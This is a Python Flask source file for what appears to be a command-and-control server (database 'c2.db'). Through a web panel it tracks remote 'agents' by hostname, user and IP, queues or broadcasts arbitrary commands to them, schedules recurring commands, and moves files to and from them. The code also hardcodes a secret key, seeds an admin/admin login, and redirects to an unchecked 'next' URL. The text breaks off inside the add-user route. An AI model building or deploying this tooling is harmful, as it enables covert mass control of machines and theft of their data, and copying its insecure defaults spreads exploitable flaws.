#before you start this app, you must create your own "BEGIN PRIVATE KEY" and "BEGIN CERTIFICATE" and put these in ssl_context=(' Example_BEGIN_CERTIFICATE.pem', 'Example_private_key.pem'), 



# app.py - Main application file
from flask import Flask, request, jsonify, render_template, send_file, redirect, url_for, flash, session
from flask_bootstrap import Bootstrap
from flask_wtf import FlaskForm, CSRFProtect
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from wtforms import StringField, TextAreaField, SelectField, FileField, BooleanField, IntegerField, PasswordField
from wtforms.validators import DataRequired, Optional, Length
from wtforms.fields import DateTimeField
import uuid
import time
import os
from collections import deque
import threading
import sqlite3
import json
from datetime import datetime, timedelta
import schedule
import atexit
from werkzeug.utils import secure_filename
import humanize
from werkzeug.security import generate_password_hash, check_password_hash
import pytz
from dateutil import parser


app = Flask(__name__)
app.config['SECRET_KEY'] = 'yourstupid'
app.config['BOOTSTRAP_BOOTSWATCH_THEME'] = 'darkly'
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['DOWNLOAD_FOLDER'] = 'downloads'
app.config['MAX_FILE_SIZE'] = 100 * 1024 * 1024  # 100MB
app.config['SCHEDULER_INTERVAL'] = 60  # seconds
app.config['DATABASE_NAME'] = 'c2.db'

bootstrap = Bootstrap(app)
csrf = CSRFProtect(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

# Ensure upload directories exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['DOWNLOAD_FOLDER'], exist_ok=True)

# Forms
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    password = PasswordField('Password', validators=[DataRequired()])
    remember = BooleanField('Remember Me')

class CommandForm(FlaskForm):
    agent_id = SelectField('Agent', coerce=str, validators=[Optional()])
    command = TextAreaField('Command', validators=[DataRequired()], render_kw={"placeholder": "Enter command to execute"})
    is_file = BooleanField('Is File Upload')
    file = FileField('File', validators=[Optional()])
    broadcast = BooleanField('Send to all agents')

class ScheduleForm(FlaskForm):
    agent_id = SelectField('Agent', coerce=str, validators=[Optional()])
    command = TextAreaField('Command', validators=[DataRequired()], render_kw={"placeholder": "Enter command to schedule"})
    schedule_time = DateTimeField('Schedule Time', format='%Y-%m-%d %H:%M:%S', validators=[Optional()])
    is_recurring = BooleanField('Recurring Command')
    interval_seconds = IntegerField('Interval (seconds)', default=3600, validators=[Optional()])
    broadcast = BooleanField('Send to all agents')

class FileUploadForm(FlaskForm):
    agent_id = SelectField('Agent', coerce=str, validators=[Optional()])
    file = FileField('File', validators=[DataRequired()], render_kw={"accept": "*"})
    broadcast = BooleanField('Send to all agents')

class SettingsForm(FlaskForm):
    max_file_size = IntegerField('Max File Size (MB)', validators=[DataRequired()])
    session_timeout = IntegerField('Session Timeout (minutes)', validators=[DataRequired()])
    theme = SelectField('Theme', choices=[
        ('darkly', 'Dark'),
        ('litera', 'Light'),
        ('cyborg', 'Cyber'),
        ('solar', 'Solar')
    ])

class UserForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=4, max=25)])
    password = PasswordField('Password', validators=[DataRequired(), Length(min=6)])
    is_admin = BooleanField('Admin Privileges')

class User(UserMixin):
    def __init__(self, id, username, password_hash, is_admin):
        self.id = id
        self.username = username
        self.password_hash = password_hash
        self.is_admin = is_admin

    def verify_password(self, password):
        return check_password_hash(self.password_hash, password)

class DBConnectionPool:
    def __init__(self, max_connections=10):
        self.max_connections = max_connections
        self.pool = deque(maxlen=max_connections)
        self.lock = threading.Lock()
        
    def get_connection(self):
        with self.lock:
            if self.pool:
                return self.pool.pop()
            else:
                conn = sqlite3.connect(app.config['DATABASE_NAME'], timeout=10, check_same_thread=False)
                conn.row_factory = sqlite3.Row
                return conn
                
    def return_connection(self, conn):
        with self.lock:
            if len(self.pool) < self.max_connections:
                self.pool.append(conn)
            else:
                conn.close()

db_pool = DBConnectionPool(max_connections=20)

def init_db():
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS agents
                     (id TEXT PRIMARY KEY, 
                      hostname TEXT,
                      os TEXT,
                      username TEXT,
                      ip TEXT, 
                      info TEXT, 
                      last_seen REAL, 
                      active INTEGER, 
                      reconnect_attempts INTEGER DEFAULT 0, 
                      last_reconnect REAL,
                      created_at REAL)''')
        c.execute('''CREATE TABLE IF NOT EXISTS commands
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                      agent_id TEXT, 
                      command TEXT, 
                      timestamp REAL, 
                      is_file INTEGER DEFAULT 0, 
                      file_path TEXT, 
                      is_scheduled INTEGER DEFAULT 0, 
                      scheduled_time REAL,
                      is_recurring INTEGER DEFAULT 0, 
                      interval_seconds INTEGER,
                      user TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS results
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      agent_id TEXT, 
                      command_id INTEGER,
                      output TEXT, 
                      timestamp REAL,
                      is_file INTEGER DEFAULT 0, 
                      file_path TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS files
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      agent_id TEXT, 
                      filename TEXT, 
                      filepath TEXT,
                      size INTEGER, 
                      upload_time REAL, 
                      direction TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS users
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      username TEXT UNIQUE,
                      password_hash TEXT,
                      last_login REAL,
                      is_admin INTEGER DEFAULT 0)''')
        
        admin = c.execute("SELECT * FROM users WHERE username = 'admin'").fetchone()
        if not admin:
            c.execute("INSERT INTO users (username, password_hash, is_admin) VALUES (?, ?, 1)",
                     ('admin', generate_password_hash('admin')))
        
        conn.commit()
    finally:
        db_pool.return_connection(conn)

init_db()

active_agents = set()
command_queue = {}
result_cache = deque(maxlen=1000)

def run_scheduled_tasks():
    while True:
        schedule.run_pending()
        time.sleep(app.config['SCHEDULER_INTERVAL'])

scheduler_thread = threading.Thread(target=run_scheduled_tasks, daemon=True)
scheduler_thread.start()

def cleanup_agents():
    while True:
        time.sleep(60)
        cutoff = time.time() - 300
        try:
            conn = db_pool.get_connection()
            c = conn.cursor()
            c.execute("UPDATE agents SET active = 0 WHERE last_seen < ?", (cutoff,))
            c.execute("""UPDATE agents 
                        SET reconnect_attempts = reconnect_attempts + 1, 
                            last_reconnect = ?
                        WHERE active = 0 AND last_seen < ?""", 
                     (time.time(), cutoff))
            c.execute("""UPDATE agents 
                        SET reconnect_attempts = 0 
                        WHERE active = 1 AND reconnect_attempts > 0""")
            conn.commit()
            
            active = c.execute("SELECT id FROM agents WHERE active = 1").fetchall()
            active_agents.clear()
            active_agents.update(a['id'] for a in active)
            
            week_ago = time.time() - (7 * 24 * 3600)
            c.execute("DELETE FROM results WHERE timestamp < ?", (week_ago,))
            c.execute("DELETE FROM files WHERE upload_time < ?", (week_ago,))
            
            conn.commit()
        except Exception as e:
            app.logger.error(f"Cleanup error: {e}")
        finally:
            db_pool.return_connection(conn)

cleanup_thread = threading.Thread(target=cleanup_agents, daemon=True)
cleanup_thread.start()

def save_uploaded_file(file, agent_id):
    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], f"{agent_id}_{int(time.time())}_{filename}")
    file.save(filepath)
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("""INSERT INTO files 
                    (agent_id, filename, filepath, size, upload_time, direction)
                    VALUES (?, ?, ?, ?, ?, ?)""",
                 (agent_id, filename, filepath, os.path.getsize(filepath), 
                  time.time(), 'upload'))
        conn.commit()
    finally:
        db_pool.return_connection(conn)
    
    return filepath

def record_downloaded_file(agent_id, filename, filepath):
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("""INSERT INTO files 
                    (agent_id, filename, filepath, size, upload_time, direction)
                    VALUES (?, ?, ?, ?, ?, ?)""",
                 (agent_id, filename, filepath, os.path.getsize(filepath), 
                  time.time(), 'download'))
        conn.commit()
    finally:
        db_pool.return_connection(conn)

def schedule_recurring_command(agent_id, command, interval_seconds):
    def job():
        conn = db_pool.get_connection()
        try:
            c = conn.cursor()
            c.execute("""INSERT INTO commands 
                        (agent_id, command, timestamp, is_scheduled, is_recurring, interval_seconds, user)
                        VALUES (?, ?, ?, 1, 1, ?, ?)""",
                     (agent_id, command, time.time(), interval_seconds, current_user.username))
            conn.commit()
        finally:
            db_pool.return_connection(conn)
    
    schedule.every(interval_seconds).seconds.do(job)
    return job

def get_active_agents():
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        agents = c.execute("SELECT id, hostname, os FROM agents WHERE active = 1 ORDER BY hostname").fetchall()
        return [(a['id'], f"{a['hostname']} ({a['os']})" if a['hostname'] else a['id']) for a in agents]
    finally:
        db_pool.return_connection(conn)

def humanize_time(timestamp):
    if not timestamp:
        return "Never"
    return humanize.naturaltime(datetime.now() - datetime.fromtimestamp(timestamp))

def format_output(output, max_length=100):
    if len(output) > max_length:
        return output[:max_length] + '...'
    return output

@login_manager.user_loader
def load_user(user_id):
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        user = c.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
        if user:
            return User(user['id'], user['username'], user['password_hash'], user['is_admin'])
        return None
    finally:
        db_pool.return_connection(conn)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    
    form = LoginForm()
    if form.validate_on_submit():
        conn = db_pool.get_connection()
        try:
            c = conn.cursor()
            user = c.execute("SELECT * FROM users WHERE username = ?", (form.username.data,)).fetchone()
            if user and check_password_hash(user['password_hash'], form.password.data):
                user_obj = User(user['id'], user['username'], user['password_hash'], user['is_admin'])
                login_user(user_obj, remember=form.remember.data)
                
                c.execute("UPDATE users SET last_login = ? WHERE id = ?", (time.time(), user['id']))
                conn.commit()
                
                flash('Logged in successfully', 'success')
                next_page = request.args.get('next')
                return redirect(next_page or url_for('dashboard'))
            else:
                flash('Invalid username or password', 'danger')
        finally:
            db_pool.return_connection(conn)
    
    return render_template('login.html', form=form)

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out', 'info')
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        active_count = c.execute("SELECT COUNT(*) FROM agents WHERE active = 1").fetchone()[0]
        recent_results = c.execute("SELECT COUNT(*) FROM results WHERE timestamp > ?", 
                                 (time.time() - 3600,)).fetchone()[0]
        pending_commands = c.execute("SELECT COUNT(*) FROM commands WHERE is_scheduled = 0").fetchone()[0]
        
        recent_agents = c.execute("""SELECT id, hostname, os, last_seen 
                                   FROM agents 
                                   ORDER BY last_seen DESC 
                                   LIMIT 5""").fetchall()
        
        recent_results_data = c.execute("""SELECT r.id, r.agent_id, a.hostname, r.output, r.timestamp 
                                         FROM results r JOIN agents a ON r.agent_id = a.id 
                                         ORDER BY r.timestamp DESC 
                                         LIMIT 5""").fetchall()
        
        return render_template('dashboard.html',
                             active_agents=active_count,
                             recent_results=recent_results,
                             pending_commands=pending_commands,
                             recent_agents=recent_agents,
                             recent_results_data=recent_results_data)
    finally:
        db_pool.return_connection(conn)

@app.route('/agents')
@login_required
def agents_view():
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 20))
    status_filter = request.args.get('status', 'all')
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        query = """SELECT id, hostname, os, username, ip, info, last_seen, 
                  reconnect_attempts, last_reconnect, created_at 
                  FROM agents"""
        where_clauses = []
        params = []
        
        if status_filter == 'active':
            where_clauses.append("active = 1")
        elif status_filter == 'inactive':
            where_clauses.append("active = 0")
        
        if where_clauses:
            query += " WHERE " + " AND ".join(where_clauses)
        
        query += " ORDER BY last_seen DESC LIMIT ? OFFSET ?"
        params.extend([per_page, (page-1)*per_page])
        
        c.execute(query, params)
        agents = []
        for row in c.fetchall():
            agents.append({
                'id': row['id'],
                'hostname': row['hostname'] or 'Unknown',
                'os': row['os'] or 'Unknown',
                'username': row['username'] or 'Unknown',
                'ip': row['ip'],
                'info': json.loads(row['info']) if row['info'] else {},
                'last_seen': row['last_seen'],
                'last_seen_human': humanize_time(row['last_seen']),
                'status': 'active' if row['last_seen'] > time.time() - 300 else 'inactive',
                'reconnect_attempts': row['reconnect_attempts'],
                'last_reconnect': humanize_time(row['last_reconnect']),
                'created_at': datetime.fromtimestamp(row['created_at']).strftime('%Y-%m-%d') if row['created_at'] else 'Unknown'
            })
        
        count_query = "SELECT COUNT(*) FROM agents"
        if where_clauses:
            count_query += " WHERE " + " AND ".join(where_clauses)
        
        c.execute(count_query, params[:-2])
        total = c.fetchone()[0]
        
        return render_template('agents.html', 
                             agents=agents,
                             status_filter=status_filter,
                             pagination={
                                 'page': page,
                                 'per_page': per_page,
                                 'total': total,
                                 'pages': (total + per_page - 1) // per_page
                             })
    finally:
        db_pool.return_connection(conn)

@app.route('/agent/<agent_id>')
@login_required
def agent_detail(agent_id):
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        agent = c.execute("""SELECT id, hostname, os, username, ip, info, last_seen, 
                            reconnect_attempts, last_reconnect, created_at 
                            FROM agents WHERE id = ?""", (agent_id,)).fetchone()
        
        if not agent:
            flash('Agent not found', 'danger')
            return redirect(url_for('agents_view'))
        
        agent_info = {
            'id': agent['id'],
            'hostname': agent['hostname'] or 'Unknown',
            'os': agent['os'] or 'Unknown',
            'username': agent['username'] or 'Unknown',
            'ip': agent['ip'],
            'info': json.loads(agent['info']) if agent['info'] else {},
            'last_seen': humanize_time(agent['last_seen']),
            'status': 'active' if agent['last_seen'] > time.time() - 300 else 'inactive',
            'reconnect_attempts': agent['reconnect_attempts'],
            'last_reconnect': humanize_time(agent['last_reconnect']),
            'created_at': datetime.fromtimestamp(agent['created_at']).strftime('%Y-%m-%d %H:%M:%S') if agent['created_at'] else 'Unknown'
        }
        
        commands = c.execute("""SELECT id, command, timestamp, is_file, file_path 
                              FROM commands 
                              WHERE agent_id = ? 
                              ORDER BY timestamp DESC LIMIT 10""", (agent_id,)).fetchall()
        
        results = c.execute("""SELECT id, output, timestamp, is_file, file_path 
                             FROM results 
                             WHERE agent_id = ? 
                             ORDER BY timestamp DESC LIMIT 10""", (agent_id,)).fetchall()
        
        command_form = CommandForm()
        command_form.agent_id.choices = get_active_agents()
        command_form.agent_id.data = agent_id
        
        schedule_form = ScheduleForm()
        schedule_form.agent_id.choices = get_active_agents()
        schedule_form.agent_id.data = agent_id
        
        file_form = FileUploadForm()
        file_form.agent_id.choices = get_active_agents()
        file_form.agent_id.data = agent_id
        
        return render_template('agent_detail.html',
                            agent=agent_info,
                            commands=commands,
                            results=results,
                            command_form=command_form,
                            schedule_form=schedule_form,
                            file_form=file_form)
    finally:
        db_pool.return_connection(conn)

@app.route('/send_command', methods=['GET', 'POST'])
@login_required
def send_command_ui():
    form = CommandForm()
    form.agent_id.choices = get_active_agents()
    
    if form.validate_on_submit():
        agent_id = None if form.broadcast.data else form.agent_id.data
        cmd = form.command.data
        is_file = form.is_file.data
        file = form.file.data if is_file else None
        
        if not cmd and not is_file:
            flash('No command or file provided', 'danger')
            return redirect(request.referrer or url_for('dashboard'))
        
        file_path = None
        if is_file and file:
            if file.content_length > app.config['MAX_FILE_SIZE']:
                flash('File too large', 'danger')
                return redirect(request.referrer or url_for('dashboard'))
            file_path = save_uploaded_file(file, agent_id or 'broadcast')
        
        if agent_id:
            conn = db_pool.get_connection()
            try:
                c = conn.cursor()
                c.execute("""INSERT INTO commands 
                            (agent_id, command, timestamp, is_file, file_path, user)
                            VALUES (?, ?, ?, ?, ?, ?)""",
                         (agent_id, cmd, time.time(), 1 if is_file else 0, file_path, current_user.username))
                conn.commit()
                flash(f'Command queued for agent {agent_id}', 'success')
            finally:
                db_pool.return_connection(conn)
        else:
            conn = db_pool.get_connection()
            try:
                c = conn.cursor()
                agents = c.execute("SELECT id FROM agents WHERE active = 1").fetchall()
                
                for agent in agents:
                    c.execute("""INSERT INTO commands 
                                (agent_id, command, timestamp, is_file, file_path, user)
                                VALUES (?, ?, ?, ?, ?, ?)""",
                             (agent['id'], cmd, time.time(), 1 if is_file else 0, file_path, current_user.username))
                
                conn.commit()
                flash(f'Command sent to {len(agents)} agents', 'success')
            finally:
                db_pool.return_connection(conn)
        
        return redirect(request.referrer or url_for('dashboard'))
    
    return render_template('send_command.html', form=form)

@app.route('/schedule_command', methods=['GET', 'POST'])
@login_required
def schedule_command_ui():
    form = ScheduleForm()
    form.agent_id.choices = get_active_agents()
    
    if form.validate_on_submit():
        agent_id = None if form.broadcast.data else form.agent_id.data
        cmd = form.command.data
        is_recurring = form.is_recurring.data
        interval_seconds = form.interval_seconds.data
        
        if not cmd:
            flash('No command provided', 'danger')
            return redirect(request.referrer or url_for('dashboard'))
        
        if is_recurring:
            if not interval_seconds or interval_seconds <= 0:
                flash('Invalid interval', 'danger')
                return redirect(request.referrer or url_for('dashboard'))
            
            if agent_id:
                job = schedule_recurring_command(agent_id, cmd, interval_seconds)
                scheduled_time = time.time() + interval_seconds
                
                conn = db_pool.get_connection()
                try:
                    c = conn.cursor()
                    c.execute("""INSERT INTO commands 
                                (agent_id, command, timestamp, is_scheduled, is_recurring, interval_seconds, user)
                                VALUES (?, ?, ?, 1, 1, ?, ?)""",
                             (agent_id, cmd, scheduled_time, interval_seconds, current_user.username))
                    conn.commit()
                finally:
                    db_pool.return_connection(conn)
                
                flash(f'Recurring command scheduled every {interval_seconds} seconds for agent {agent_id}', 'success')
            else:
                conn = db_pool.get_connection()
                try:
                    c = conn.cursor()
                    agents = c.execute("SELECT id FROM agents WHERE active = 1").fetchall()
                    
                    for agent in agents:
                        job = schedule_recurring_command(agent['id'], cmd, interval_seconds)
                        scheduled_time = time.time() + interval_seconds
                        
                        c.execute("""INSERT INTO commands 
                                    (agent_id, command, timestamp, is_scheduled, is_recurring, interval_seconds, user)
                                    VALUES (?, ?, ?, 1, 1, ?, ?)""",
                                 (agent['id'], cmd, scheduled_time, interval_seconds, current_user.username))
                    
                    conn.commit()
                    flash(f'Recurring command scheduled every {interval_seconds} seconds for {len(agents)} agents', 'success')
                finally:
                    db_pool.return_connection(conn)
        else:
            schedule_time = form.schedule_time.data
            if not schedule_time:
                flash('No schedule time provided', 'danger')
                return redirect(request.referrer or url_for('dashboard'))
            
            scheduled_time = schedule_time.timestamp()
            if scheduled_time < time.time():
                flash('Schedule time must be in the future', 'danger')
                return redirect(request.referrer or url_for('dashboard'))
                
            if agent_id:
                conn = db_pool.get_connection()
                try:
                    c = conn.cursor()
                    c.execute("""INSERT INTO commands 
                                (agent_id, command, timestamp, is_scheduled, scheduled_time, user)
                                VALUES (?, ?, ?, 1, ?, ?)""",
                             (agent_id, cmd, scheduled_time, scheduled_time, current_user.username))
                    
                    def job():
                        conn = db_pool.get_connection()
                        try:
                            c = conn.cursor()
                            c.execute("""INSERT INTO commands 
                                        (agent_id, command, timestamp, user)
                                        VALUES (?, ?, ?, ?)""",
                                     (agent_id, cmd, time.time(), 'system'))
                            conn.commit()
                        finally:
                            db_pool.return_connection(conn)
                    
                    schedule_time_datetime = datetime.fromtimestamp(scheduled_time)
                    schedule.every().day.at(schedule_time_datetime.strftime('%H:%M')).do(job)
                    
                    conn.commit()
                    flash(f'Command scheduled for {schedule_time} for agent {agent_id}', 'success')
                finally:
                    db_pool.return_connection(conn)
            else:
                conn = db_pool.get_connection()
                try:
                    c = conn.cursor()
                    agents = c.execute("SELECT id FROM agents WHERE active = 1").fetchall()
                    
                    for agent in agents:
                        c.execute("""INSERT INTO commands 
                                    (agent_id, command, timestamp, is_scheduled, scheduled_time, user)
                                    VALUES (?, ?, ?, 1, ?, ?)""",
                                 (agent['id'], cmd, scheduled_time, scheduled_time, current_user.username))
                        
                        def job(agent_id=agent['id']):
                            conn = db_pool.get_connection()
                            try:
                                c = conn.cursor()
                                c.execute("""INSERT INTO commands 
                                            (agent_id, command, timestamp, user)
                                            VALUES (?, ?, ?, ?)""",
                                         (agent_id, cmd, time.time(), 'system'))
                                conn.commit()
                            finally:
                                db_pool.return_connection(conn)
                        
                        schedule_time_datetime = datetime.fromtimestamp(scheduled_time)
                        schedule.every().day.at(schedule_time_datetime.strftime('%H:%M')).do(job)
                    
                    conn.commit()
                    flash(f'Command scheduled for {schedule_time} for {len(agents)} agents', 'success')
                finally:
                    db_pool.return_connection(conn)
        
        return redirect(request.referrer or url_for('dashboard'))
    
    return render_template('schedule_command.html', form=form)

@app.route('/results')
@login_required
def results_view():
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 20))
    agent_id = request.args.get('agent_id', None)
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        query = """SELECT r.id, r.agent_id, a.hostname, r.output, r.timestamp, r.is_file, r.file_path 
                  FROM results r JOIN agents a ON r.agent_id = a.id"""
        params = []
        
        if agent_id:
            query += " WHERE r.agent_id = ?"
            params.append(agent_id)
        
        query += " ORDER BY r.timestamp DESC LIMIT ? OFFSET ?"
        params.extend([per_page, (page-1)*per_page])
        
        c.execute(query, params)
        results = []
        for row in c.fetchall():
            results.append({
                'id': row['id'],
                'agent_id': row['agent_id'],
                'hostname': row['hostname'] or row['agent_id'],
                'output': format_output(row['output']),
                'full_output': row['output'],
                'timestamp': row['timestamp'],
                'time_ago': humanize_time(row['timestamp']),
                'is_file': bool(row['is_file']),
                'file_path': row['file_path'],
                'file_id': row['id'] if bool(row['is_file']) else None
            })
        
        count_query = "SELECT COUNT(*) FROM results"
        if agent_id:
            count_query += " WHERE agent_id = ?"
            c.execute(count_query, (agent_id,))
        else:
            c.execute(count_query)
        
        total = c.fetchone()[0]
        
        agents = c.execute("SELECT id, hostname FROM agents ORDER BY hostname").fetchall()
        
        return render_template('results.html', 
                             results=results,
                             agents=agents,
                             selected_agent=agent_id,
                             pagination={
                                 'page': page,
                                 'per_page': per_page,
                                 'total': total,
                                 'pages': (total + per_page - 1) // per_page
                             })
    finally:
        db_pool.return_connection(conn)

@app.route('/result/<int:result_id>')
@login_required
def result_detail(result_id):
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        result = c.execute("""SELECT r.id, r.agent_id, a.hostname, r.output, r.timestamp, 
                             r.is_file, r.file_path, r.command_id
                          FROM results r JOIN agents a ON r.agent_id = a.id
                          WHERE r.id = ?""", (result_id,)).fetchone()
        
        if not result:
            flash('Result not found', 'danger')
            return redirect(url_for('results_view'))
        
        command = None
        if result['command_id']:
            command = c.execute("SELECT command FROM commands WHERE id = ?", (result['command_id'],)).fetchone()
        
        result_info = {
            'id': result['id'],
            'agent_id': result['agent_id'],
            'hostname': result['hostname'] or result['agent_id'],
            'output': result['output'],
            'timestamp': datetime.fromtimestamp(result['timestamp']).strftime('%Y-%m-%d %H:%M:%S'),
            'time_ago': humanize_time(result['timestamp']),
            'is_file': bool(result['is_file']),
            'file_path': result['file_path'],
            'file_id': result['id'] if bool(result['is_file']) else None,
            'command': command['command'] if command else 'Unknown'
        }
        
        return render_template('result_detail.html', result=result_info)
    finally:
        db_pool.return_connection(conn)

@app.route('/files')
@login_required
def files_view():
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 20))
    agent_id = request.args.get('agent_id', None)
    direction = request.args.get('direction', None)
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        query = """SELECT f.id, f.agent_id, a.hostname, f.filename, f.filepath, 
                          f.size, f.upload_time, f.direction
                  FROM files f JOIN agents a ON f.agent_id = a.id"""
        where_clauses = []
        params = []
        
        if agent_id:
            where_clauses.append("f.agent_id = ?")
            params.append(agent_id)
        if direction:
            where_clauses.append("f.direction = ?")
            params.append(direction)
        
        if where_clauses:
            query += " WHERE " + " AND ".join(where_clauses)
        
        query += " ORDER BY f.upload_time DESC LIMIT ? OFFSET ?"
        params.extend([per_page, (page-1)*per_page])
        
        c.execute(query, params)
        files = []
        for row in c.fetchall():
            files.append({
                'id': row['id'],
                'agent_id': row['agent_id'],
                'hostname': row['hostname'] or row['agent_id'],
                'filename': row['filename'],
                'filepath': row['filepath'],
                'size': row['size'],
                'size_human': humanize.naturalsize(row['size']),
                'upload_time': row['upload_time'],
                'time_ago': humanize_time(row['upload_time']),
                'direction': row['direction']
            })
        
        count_query = "SELECT COUNT(*) FROM files"
        if where_clauses:
            count_query += " WHERE " + " AND ".join(where_clauses)
        
        c.execute(count_query, params[:-2])
        total = c.fetchone()[0]
        
        agents = c.execute("SELECT id, hostname FROM agents ORDER BY hostname").fetchall()
        
        return render_template('files.html', 
                             files=files,
                             agents=agents,
                             selected_agent=agent_id,
                             selected_direction=direction,
                             pagination={
                                 'page': page,
                                 'per_page': per_page,
                                 'total': total,
                                 'pages': (total + per_page - 1) // per_page
                             })
    finally:
        db_pool.return_connection(conn)

@app.route('/download/<int:file_id>')
@login_required
def download_file(file_id):
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        file_info = c.execute("""SELECT filepath, filename FROM files 
                               WHERE id = ? AND direction = 'download'""",
                            (file_id,)).fetchone()
        
        if not file_info:
            flash('File not found', 'danger')
            return redirect(request.referrer or url_for('files_view'))
            
        return send_file(file_info['filepath'], as_attachment=True, download_name=file_info['filename'])
    finally:
        db_pool.return_connection(conn)

@app.route('/stats')
@login_required
def stats_view():
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        active_count = c.execute("SELECT COUNT(*) FROM agents WHERE active = 1").fetchone()[0]
        inactive_count = c.execute("SELECT COUNT(*) FROM agents WHERE active = 0").fetchone()[0]
        
        os_dist = c.execute("""SELECT os, COUNT(*) as count 
                             FROM agents 
                             GROUP BY os 
                             ORDER BY count DESC""").fetchall()
        
        recent_results = c.execute("SELECT COUNT(*) FROM results WHERE timestamp > ?", 
                                 (time.time() - 3600,)).fetchone()[0]
        
        pending_commands = c.execute("SELECT COUNT(*) FROM commands WHERE is_scheduled = 0").fetchone()[0]
        
        scheduled_tasks = c.execute("SELECT COUNT(*) FROM commands WHERE is_scheduled = 1").fetchone()[0]
        
        upload_stats = c.execute("""SELECT COUNT(*) as count, SUM(size) as total_size 
                                  FROM files 
                                  WHERE direction = 'upload' AND upload_time > ?""",
                               (time.time() - 86400,)).fetchone()
        download_stats = c.execute("""SELECT COUNT(*) as count, SUM(size) as total_size 
                                    FROM files 
                                    WHERE direction = 'download' AND upload_time > ?""",
                                 (time.time() - 86400,)).fetchone()
        
        command_freq = c.execute("""SELECT command, COUNT(*) as count 
                                  FROM commands 
                                  GROUP BY command 
                                  ORDER BY count DESC 
                                  LIMIT 10""").fetchall()
        
        timeline = []
        for i in range(7, -1, -1):
            day_start = time.time() - (i * 86400)
            day_end = day_start + 86400
            
            day_name = datetime.fromtimestamp(day_start).strftime('%a')
            day_date = datetime.fromtimestamp(day_start).strftime('%Y-%m-%d')
            
            c.execute("""SELECT COUNT(DISTINCT agent_id) as active_agents 
                        FROM results 
                        WHERE timestamp BETWEEN ? AND ?""",
                     (day_start, day_end))
            active = c.fetchone()[0]
            
            c.execute("""SELECT COUNT(*) as commands 
                        FROM commands 
                        WHERE timestamp BETWEEN ? AND ?""",
                     (day_start, day_end))
            commands = c.fetchone()[0]
            
            timeline.append({
                'day': day_name,
                'date': day_date,
                'active_agents': active,
                'commands': commands
            })
        
        return render_template('stats.html',
                            active_agents=active_count,
                            inactive_agents=inactive_count,
                            os_dist=os_dist,
                            recent_results=recent_results,
                            pending_commands=pending_commands,
                            scheduled_tasks=scheduled_tasks,
                            uploads_last_24h=upload_stats['count'],
                            downloads_last_24h=download_stats['count'],
                            upload_volume=humanize.naturalsize(upload_stats['total_size']) if upload_stats['total_size'] else '0',
                            download_volume=humanize.naturalsize(download_stats['total_size']) if download_stats['total_size'] else '0',
                            command_freq=command_freq,
                            timeline=timeline)
    finally:
        db_pool.return_connection(conn)

@app.route('/settings', methods=['GET', 'POST'])
@login_required
def settings():
    if not current_user.is_admin:
        flash('Admin privileges required', 'danger')
        return redirect(url_for('dashboard'))
    
    form = SettingsForm()
    
    if form.validate_on_submit():
        app.config['MAX_FILE_SIZE'] = form.max_file_size.data * 1024 * 1024
        app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=form.session_timeout.data)
        app.config['BOOTSTRAP_BOOTSWATCH_THEME'] = form.theme.data
        flash('Settings updated successfully', 'success')
    
    # Set current values in form
    form.max_file_size.data = app.config['MAX_FILE_SIZE'] // (1024 * 1024)
    form.session_timeout.data = app.config['PERMANENT_SESSION_LIFETIME'].total_seconds() // 60
    form.theme.data = app.config['BOOTSTRAP_BOOTSWATCH_THEME']
    
    return render_template('settings.html', form=form)

@app.route('/users')
@login_required
def users_view():
    if not current_user.is_admin:
        flash('Admin privileges required', 'danger')
        return redirect(url_for('dashboard'))
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        users = c.execute("SELECT id, username, last_login, is_admin FROM users ORDER BY username").fetchall()
        
        user_list = []
        for user in users:
            user_list.append({
                'id': user['id'],
                'username': user['username'],
                'last_login': humanize_time(user['last_login']),
                'is_admin': bool(user['is_admin'])
            })
        
        return render_template('users.html', users=user_list)
    finally:
        db_pool.return_connection(conn)

@app.route('/users/add', methods=['GET', 'POST'])
@login_required
def add_user():
    if not current_user.is_admin:
        flash('Admin privileges required', 'danger')
        return redirect(url_for('dashboard'))
    
    form = UserForm()
    
    if form.validate_on_submit():
        conn = db_pool.get_connection()
